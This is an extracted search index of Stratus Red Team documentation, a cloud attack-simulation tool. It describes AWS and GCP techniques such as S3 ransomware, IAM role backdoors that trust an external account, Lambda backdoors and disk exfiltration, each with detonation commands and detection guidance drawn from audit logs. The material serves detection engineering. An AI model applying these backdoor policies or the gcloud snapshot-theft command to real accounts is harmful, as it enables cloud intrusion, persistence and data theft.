\"ARN\": \"arn:aws:s3:::target-bucket\"\n    }\n  ],\n  \"eventType\": \"AwsApiCall\",\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>Note that <code>DeleteObjects</code> does not indicate the list of files deleted, or how many files were removed (which can be up to 1'000 files per call).'</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/","title":"S3 Ransomware through client-side encryption","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Impact</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that encrypts files in a bucket with a static key, through S3 client-side encryption feature. Warm-up: </p> <ul> <li>Create an S3 bucket</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all objects in the bucket</li> <li>Overwrite every file in the bucket with an encrypted version, using S3 client-side encryption</li> <li>Upload a ransom note to the bucket</li> </ul> <p>References:</p> <ul> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-client-side-encryption\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>, <code>CopyObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample CloudTrail event <code>CopyObject</code>, when a file is encrypted with a client-side key:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"CopyObject\",\n  \"eventType\": \"AwsApiCall\",\n  \"eventCategory\": \"Data\",\n  \"managementEvent\": false,\n  \"readOnly\": false,\n  \"requestParameters\": {\n    \"bucketName\": \"target bucket\",\n    \"Host\": \"target bucket.s3.us-east-1.amazonaws.com\",\n    \"x-amz-server-side-encryption-customer-algorithm\": \"AES256\",\n    \"x-amz-copy-source\": \"target bucket/target file.txt\",\n    \"key\": \"target file.txt\",\n    \"x-id\": \"CopyObject\"\n  },\n  \"responseElements\": {\n    \"x-amz-server-side-encryption-customer-algorithm\": \"AES256\"\n  },\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARN\": \"arn:aws:s3:::target bucket/target file.txt\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::target bucket\"\n    }\n  ]\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/","title":"S3 Ransomware through individual file deletion","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Impact</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that empties a bucket through individual file deletion, then uploads a ransom note.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket, with versioning enabled</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all available objects and their versions in the bucket</li> <li>Delete all objects in the bucket one by one, using DeleteObject</li> <li>Upload a ransom note to the bucket</li> </ul> <p>Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.</p> <p>References:</p> <ul> <li>The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)</li> <li>The anatomy of ransomware event targeting data residing in Amazon S3 (AWS Security Blog)</li> <li>Ransomware in the cloud</li> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> <li>https://www.invictus-ir.com/news/ransomware-in-the-cloud</li> <li>https://dfir.ch/posts/aws_ransomware/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-individual-deletion\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample CloudTrail event <code>DeleteObject</code>, shortened for readability:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"DeleteObject\",\n  \"eventCategory\": \"Data\",\n  \"managementEvent\": false,\n  \"readOnly\": false,\n  \"requestParameters\": {\n    \"bucketName\": \"target-bucket\",\n    \"Host\": \"target-bucket.s3.us-east-1.amazonaws.com\",\n    \"key\": \"target-object-key\",\n    \"x-id\": \"DeleteObject\"\n  },\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARN\": \"arn:aws:s3:::target-bucket/target-object-key\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::target-bucket\"\n    }\n  ],\n  \"eventType\": \"AwsApiCall\",\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/","title":"Console Login without MFA","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Initial Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#description","title":"Description","text":"<p>Simulates a login to the AWS Console for an IAM user without multi-factor authentication (MFA).</p> <p>Warm-up:</p> <ul> <li>Create an IAM user</li> <li>Create a console profile for this user so it can log in to the AWS Console</li> </ul> <p>Detonation:</p> <ul> <li>Log in to the AWS Console</li> </ul> <p>References:</p> <ul> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> <li>https://naikordian.github.io/blog/posts/brute-force-aws-console/</li> </ul>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.initial-access.console-login-without-mfa\n</code></pre>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#detection","title":"Detection","text":"<p>Using CloudTrail <code>ConsoleLogin</code> event. The field <code>additionalEventData.MFAUser</code> is set to <code>No</code> when the authentication does not use MFA.</p> <p>Sample CloudTrail event (redacted for clarity):</p> <pre><code>{\n    \"userIdentity\": {\n        \"session_name\": \"console-user-wgrosmao\",\n        \"type\": \"IAMUser\",\n        \"arn\": \"arn:aws:iam::123456789123:user/console-user-wgrosmao\",\n        \"accountId\": \"123456789123\",\n        \"userName\": \"console-user-wgrosmao\",\n        \"principalId\": \"AIDA254BBSGPKOYEB6PTV\"\n    },\n    \"eventSource\": \"signin.amazonaws.com\",\n    \"eventType\": \"AwsConsoleSignIn\",\n    \"eventCategory\": \"Management\",\n    \"awsRegion\": \"us-east-1\",\n    \"eventName\": \"ConsoleLogin\",\n    \"readOnly\": false,\n    \"eventTime\": \"2022-05-30T14:24:34Z\",\n    \"managementEvent\": true,\n    \"additionalEventData\": {\n        \"MFAUsed\": \"No\",\n        \"LoginTo\": \"https://console.aws.amazon.com/console/home\",\n        \"MobileVersion\": \"No\"\n    },\n    \"responseElements\": {\n        \"ConsoleLogin\": \"Success\"\n    }\n}\n</code></pre> <p>Note that for failed console authentication events, the field <code>userIdentity.arn</code> is not set (see https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html#cloudtrail-aws-console-sign-in-events-iam-user-failure).</p>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/","title":"Usage of EC2 Instance Connect on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Lateral Movement</li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#description","title":"Description","text":"<p>Simulates an attacker pushing an SSH public key to multiple EC2 instances, which then will allow anyone with the corresponding private key to  connect directly to the systems via SSH.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Adds a public SSH key to the EC2 for 60 seconds.</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#hands-on-keyboard-activity-begins</li> <li>https://sysdig.com/blog/2023-global-cloud-threat-report/</li> <li>https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/</li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.lateral-movement.ec2-instance-connect\n</code></pre>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>SendSSHPublicKey</code> event, when a user is adding an SSH key to multiple EC2 instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n  \"eventName\": \"SendSSHPublicKey\",\n  \"requestParameters\": {\n    \"instanceId\": \"i-123456\",\n    \"instanceOSUser\": \"ec2-user\",\n    \"sSHPublicKey\": \"ssh-ed25519 ...\"\n  }\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/","title":"Backdoor an IAM Role","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#description","title":"Description","text":"<p>Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an IAM role.</li> </ul> <p>Detonation: </p> <ul> <li>Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:</li> </ul> <pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code>\n</pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-backdoor-role\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>UpdateAssumeRolePolicy</code> event.</p> </li> <li> <p>Through IAM Access Analyzer,  which generates a finding when a role can be assumed from a new AWS account or publicly.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/","title":"Create an Access Key on an IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#description","title":"Description","text":"<p>Establishes persistence by creating an access key on an existing IAM user.</p> <p>Warm-up: </p> <ul> <li>Create an IAM user.</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM access key on the user.</li> </ul> <p>References:</p> <ul> <li>https://sysdig.com/blog/scarleteel-2-0/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateAccessKey</code> event. This event can hardly be considered suspicious by itself, unless correlated with other indicators. '</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/","title":"Create an administrative IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#description","title":"Description","text":"<p>Establishes persistence by creating a new IAM user with administrative permissions.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Create the IAM user and attach the 'AdministratorAccess' managed IAM policy to it.</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence/</li> <li>https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/</li> <li>https://blog.darklab.hk/2021/07/06/trouble-in-paradise/</li> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-admin-user\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateUser</code>, <code>AttachUserPolicy</code> and <code>CreateAccessKey</code> events.</p> <p>While matching on these events may be impractical and prone to false positives in most environments, the following can help to craft more precise detections:</p> <ul> <li> <p>Identify a call to <code>CreateUser</code> closely followed by <code>AttachUserPolicy</code> with an administrator policy.</p> </li> <li> <p>Identify a call to <code>CreateUser</code> resulting in an access denied error.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/","title":"Create a backdoored IAM Role","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#description","title":"Description","text":"<p>Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from  an external, fictitious attack AWS account.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Create a new IAM role with the following trust policy:</li> </ul> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code></pre> <ul> <li>Attach the 'AdministratorAccess' managed IAM policy to it. </li> </ul> <p>Note: For safety reasons, the detonation code makes sure that this role has no real effective permissions, by attaching a permissions boundary denying all actions. This could also be achieved with an inline role policy, but using a permissions boundary allows us to use a single API call (CreateRole).</p> <p>References:</p> <ul> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-backdoor-role\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#detection","title":"Detection","text":"<ul> <li> <p>Through IAM Access Analyzer,  which generates a finding when a role can be assumed from a new AWS account or publicly.</p> </li> <li> <p>Identify a call to <code>CreateRole</code> closely followed by <code>AttachRolePolicy</code> with an administrator policy.</p> </li> <li> <p>Identify a call to <code>CreateRole</code> that contains an assumeRolePolicyDocument in the requestParameters that allows access from an external AWS account. Sample event:</p> </li> </ul> <pre><code>{\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"CreateRole\",\n  \"requestParameters\": {\n    \"roleName\": \"malicious-iam-role\",\n    \"assumeRolePolicyDocument\": \"{\\n  \\\"Version\\\": \\\"2012-10-17\\\",\\n  \\\"Statement\\\": [\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"Service\\\": \\\"ec2.amazonaws.com\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    },\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"AWS\\\": \\\"arn:aws:iam::193672423079:root\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    }\\n  ]\\n}\"\n   }\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/","title":"Create a Login Profile on an IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#description","title":"Description","text":"<p>Establishes persistence by creating a Login Profile on an existing IAM user. This allows an attacker to access an IAM user intended to be used programmatically through the AWS console usual login process. </p> <p>Warm-up:</p> <ul> <li>Create an IAM user</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM Login Profile on the user</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence/</li> <li>https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/</li> <li>https://blog.darklab.hk/2021/07/06/trouble-in-paradise/</li> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-user-login-profile\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateLoginProfile</code> or <code>UpdateLoginProfile</code> events.</p> <p>In particular, it's suspicious when these events occur on IAM users intended to be used programmatically.</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/","title":"Backdoor Lambda Function Through Resource-Based Policy","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#description","title":"Description","text":"<p>Establishes persistence by backdooring a lambda function to allow its invocation from an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function.</li> </ul> <p>Detonation: </p> <ul> <li>Modify the Lambda function resource-base policy to allow lambda:InvokeFunction from an external, fictitious AWS account.</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-backdoor-function\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>AddPermission20150331</code> and <code>AddPermission20150331v2</code> events.</p> </li> <li> <p>Through IAM Access Analyzer, which triggers a finding when permissions are added to a Lambda function making it  public or accessible from another account.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/","title":"Add a Malicious Lambda Extension","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#description","title":"Description","text":"<p>Establishes persistence by adding a malicious lambda extension.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function and a lambda extension (layer).</li> </ul> <p>Detonation: </p> <ul> <li>Add the extension as a layer to the Lambda function.</li> </ul> <p>References:</p> <ul> <li>https://www.clearvector.com/blog/lambda-spy/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-layer-extension\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateFunctionConfiguration20150331v2</code> event.</p> <p>While matching this event may be impractical and prone to false positives in most environments, the following can help to craft more precise detections:</p> <ul> <li>Identify calls to <code>UpdateFunctionConfiguration20150331v2</code> where the <code>responseElements</code> field contains <code>layer</code>, indicating that the function's layers were modified.</li> <li>Identify calls to <code>UpdateFunctionConfiguration20150331v2</code> where <code>responseElements.layers</code> includes a layer that's from a different AWS account.'</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/","title":"Overwrite Lambda Function Code","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#description","title":"Description","text":"<p>Establishes persistence by overwriting a Lambda function's code.  A further, more advanced, use-case could be updating the code to exfiltrate the data processed by the Lambda function at runtime.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function.</li> </ul> <p>Detonation: </p> <ul> <li>Update the Lambda function code.</li> </ul> <p>References:</p> <ul> <li>https://research.splunk.com/cloud/aws_lambda_updatefunctioncode/</li> <li>Expel's AWS security mindmap</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-overwrite-code\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateFunctionCode*</code> event, e.g. <code>UpdateFunctionCode20150331v2</code>.</p>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/","title":"Create an IAM Roles Anywhere trust anchor","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#description","title":"Description","text":"<p>Establishes persistence by creating an IAM Roles Anywhere trust anchor.  The IAM Roles Anywhere service allows workloads that do not run in AWS to assume roles by presenting a client-side  X.509 certificate signed by a trusted certificate authority, called a \"trust anchor\".</p> <p>Assuming IAM Roles Anywhere is in use (i.e., that some of the IAM roles in the account have a  trust policy trusting  the IAM Roles Anywhere service), an attacker creating a trust anchor can subsequently assume these roles.</p> <p>Warm-up:</p> <ul> <li>Create an IAM role that can be used by IAM Roles Anywhere (see docs)</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM Roles Anywhere trust anchor</li> <li>Create an IAM Roles Anywhere profile</li> </ul> <p>References:</p> <ul> <li>https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html</li> <li>https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.rolesanywhere-create-trust-anchor\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#detection","title":"Detection","text":"<p>Identify when a trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.</p>"},{"location":"attack-techniques/GCP/","title":"GCP","text":"<p>This page contains the Stratus attack techniques for GCP, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/GCP/#exfiltration","title":"Exfiltration","text":"<ul> <li> <p>Exfiltrate Compute Disk by sharing it</p> </li> <li> <p>Exfiltrate Compute Image by sharing it</p> </li> <li> <p>Exfiltrate Compute Disk by sharing a snapshot</p> </li> </ul>"},{"location":"attack-techniques/GCP/#persistence","title":"Persistence","text":"<ul> <li> <p>Backdoor a GCP Service Account through its IAM Policy</p> </li> <li> <p>Create an Admin GCP Service Account</p> </li> <li> <p>Create a GCP Service Account Key</p> </li> <li> <p>Invite an External User to a GCP Project</p> </li> </ul>"},{"location":"attack-techniques/GCP/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Create an Admin GCP Service Account</p> </li> <li> <p>Create a GCP Service Account Key</p> </li> <li> <p>Impersonate GCP Service Accounts</p> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/","title":"Exfiltrate Compute Disk by sharing it","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#description","title":"Description","text":"<p>Exfiltrates a Compute Disk by sharing with a fictitious attacker account. The attacker could then create a snapshot of the disk in their GCP project.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Disk</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the disk so that the attacker account has permissions to read the disk in their own project</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-disk\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-disk\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Disk, using the GCP Admin Activity audit logs event <code>v1.compute.disks.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-disk@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-disk@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.disks.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>After the attacker has permissions on the Compute Disk, they can create a snapshot of it in their own GCP project using:</p> <pre><code>gcloud compute snapshots create stolen-snapshot \\\n    --source-disk https://www.googleapis.com/compute/v1/projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\n</code></pre> <p>When they do so, a GCP Admin Activity event <code>v1.compute.snapshots.insert</code> is generated in the victim project,  indicating that the attacker has not only shared but also actively stolen data from the disk (sample event shortened below):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"attacker@gmail.com\",\n      \"principalSubject\": \"user:attacker@gmail.com\"\n    },\n    \"requestMetadata\": {\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\",\n      // Note: the IP of the attacker is not logged in this event\n    },\n    \"serviceName\": \"compute.googleapis.com\",\n    \"methodName\": \"v1.compute.snapshots.insert\",\n    \"resourceName\": 